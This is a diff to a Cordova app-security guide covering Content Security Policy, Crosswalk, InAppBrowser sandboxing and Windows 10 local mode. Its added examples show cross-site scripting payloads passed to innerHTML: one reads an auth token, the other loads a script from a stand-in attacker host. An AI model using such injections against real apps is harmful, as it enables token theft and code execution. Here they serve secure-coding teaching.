@@ -1,13 +1,13 @@
-<properties pageTitle="Cordova platform and app security"
+<properties pageTitle="Understand Cordova platform security"
   description="Cordova platform and app security"
   services=""
   documentationCenter=""
   authors="clantz" />
 
-#Cordova platform and app security
-Security is a very broad topic that covers a number of different aspects of an app's lifecycle. Securing an app often represents a number of tradeoffs and key decisions. Like the web, Cordova is a very open platform and as a result it does not force you down a specific path that will always guarantee a secure app. Instead provides a set of tools that you can use to lock down your app as appropriate. A forced lockdown approach can block critical scenarios and thus tends to have undesired results. For example, Windows 8.1's platform security features block the use of hosted content. This has been resolved in Windows 10 by instead providing options for locking down your app. Beyond platform features, Microsoft also has some additional options that you can use to further improve your overall app security. 
+#Cordova platform security features
+Security is a very broad topic that covers a number of different aspects of an app's lifecycle. Securing an app often represents a number of tradeoffs and key decisions. Like the web, Cordova is a very open platform and as a result it does not force you down a specific path that will always guarantee a secure app. Instead provides a set of tools that you can use to lock down your app as appropriate. A forced lockdown approach can block critical scenarios and thus tends to have undesired results.
 
-For the most part you should apply the same [best practices to your code as you do for web apps](https://code.google.com/archive/p/browsersec/wikis/Main.wiki). However, given the increased capabilities Cordova apps are afforded, it is important to limit your risk as much as possible. This document will outline some of the security features that exist in Cordova and related Microsoft products along with some general best practices for improving the overall security of your app beyond what you may typically think about for web apps. You may also find security articles on [data encryption and transmission](./cordova-security-data.md), [authentication](cordova-security-auth.md), and [detecting / preventing / remediating issues](./cordova-security-detect.md) of interest for further information.
+For the most part you should apply the same [best practices to your code as you do for web apps](https://code.google.com/archive/p/browsersec/wikis/Main.wiki). However, given the increased capabilities Cordova apps are afforded, it is important to limit your risk as much as possible. This document will outline some of the security features that exist in Cordova and some general best practices for improving the overall security of your app beyond what you may typically think about for web apps. 
 
 ## Update Cordova
 While always a good recommendation, staying up to date with Cordova versions is a best practice as security fixes are included on a regular basis. You should absolutely not use Cordova versions < 4.3.1 as your app will be rejected from Google Play due to a [specific security issue](../tips-and-workarounds/android/security-05-26-2015.md). Further, you should do everything you can to use **Apache Cordova 5 and up** as this version provide some critical capabilities that can improve the overall security of your app. Specifically:
@@ -38,11 +38,22 @@ Note that Crosswalk 14 can cause a crash when using Web Crypto and Crosswalk 16 
 
 You should only add this preference if you encounter issues as it disables useful features like "Shared Mode".
 
-##Use a strict content security policy
+##Use a strict Content Security Policy
 By default, simply adding a CSP declaration to an HTML page locks it down very tightly. By default, applying a CSP **disables both eval() and inline script** and only allows access to JavaScript and CSS files from the **same origin as the HTML page**. Typically for Cordova apps this means only **local content** and as a result, CDN hosted content typically cannot be referenced.  Breaking these down in terms of risk:
 
-1. **Inline script** for JavaScript content, though extremely handy for testing and development, is one of the largest risks for attacks. When inline script is allowed, all it takes is one unescaped input pumped to innerHTML to allow a user to run any arbitrary JavaScript code. Note the inline script restriction also applies to **onload** and similar HTML attributes for the exact same reason.
-2. Allowing **JavaScript and CSS content from different origins** poses the next largest risk. Disabling inline script reduces the chances of attack, but even with inline script disabled you can still add a script tag with a href to an external source. The same innerHTML mistake can then lead to a similar vulnerability. While this is obviously true for JavaScript, CSS also poses a risk because directives like expression() and url('javascript:...'). You can loosen this restriction by listing only very specific domains that you trust but exercise caution when doing so.
+1. **Inline script** for JavaScript content, though extremely handy for testing and development, is one of the largest risks for attacks. When inline script is allowed, all it takes is one unescaped input pumped to innerHTML to allow a user to run any arbitrary JavaScript code. Note the inline script restriction also applies to **onload** and similar HTML attributes for the exact same reason. For example, imagine textInput in this code game from an input element in HTML:
+    ```javascript
+    // This is bad
+    textInput = "<div id='hack-otuput'></div><script>document.getElementById('hack-output').innerText = app.user.authtoken;</script>"
+    document.getElementById("output-div").innerHTML = textInput;
+    ```
+
+2. Allowing **JavaScript and CSS content from different origins** poses the next largest risk. Disabling inline script reduces the chances of attack, but even with inline script disabled you can still add a script tag with a href to an external source. The same innerHTML mistake can then lead to a similar vulnerability. While this is obviously true for JavaScript, CSS also poses a risk because directives like expression() and url('javascript:...'). You can loosen this restriction by listing only very specific domains that you trust but exercise caution when doing so. Tweaking the previous example slightly we get:
+    ```javascript
+    // This is also bad
+    textInput = "<div id='hack-otuput'></div><script src='http://iliketohackthings.com/mybadscript.js'></script>"
+    document.getElementById("output-div").innerHTML = textInput;
+    ```
 3. **eval()** along with related features like "new Function" also pose a risk but these are reduced if the inline and same origin restrictions are left in place. Further, eval is used by a number of JavaScript frameworks for optimization purposes so while this is the default it can become quite problematic if left in place. If your app and all associated frameworks do not make use of eval, you should disable it. Otherwise avoid using eval in your own code unless you really know exactly what you are doing.
 
 Note that none of these rules apply to images or other static content. 
@@ -88,6 +99,11 @@ If you must include content from an external source that you do not have complet
     cordova plugin add cordova-plugin-inappbrowser
     ```
 
+You can now open pages not in the allow-navigation whitelist in a sandboxed webview using the simple window.open command.
+```javascript
+window.open("http://www.bing.com", "_self");
+```
+
 ##Use "Local Mode" for Windows 10
 Windows 10 support in the Cordova Windows platform improves resolves many of the differences that existed between the Windows 8.0/8.1 platform and Android and iOS. In addition, it includes a "local mode" only allows navigation to pages hosed within the app, disables inline script, and only allows JavaScript and CSS references from within the app. The end result is a significant reduction in cross-site scripting risks since this is enforced at a platform level.
 
@@ -116,6 +132,6 @@ The app wrapping tool is generally available. While the Android and iOS native A
 ##Additional Security Topics
 - [Encrypt your local app data](./cordova-security-data.md)
 - [Learn about securely transmitting data](./cordova-security-xmit.md)
-- [Authenticating users with Azure Mobile Apps or the Active Directory Authentication Library for Cordova](./cordova-security-auth.md)
-- [Detect, prevent, and quickly remediate security issues](./cordova-security-detect.md)
-- [Download samples from our Cordova Samples repository](http://github.com/Microsoft/cordova-samples)
+- [Authenticate users with Azure Mobile Apps or the Active Directory Authentication Library for Cordova](./cordova-security-auth.md)
+- [Detect potential security threats](./cordova-security-detect.md)
+- [Quickly remediate security issues](./cordova-security-fix.md)
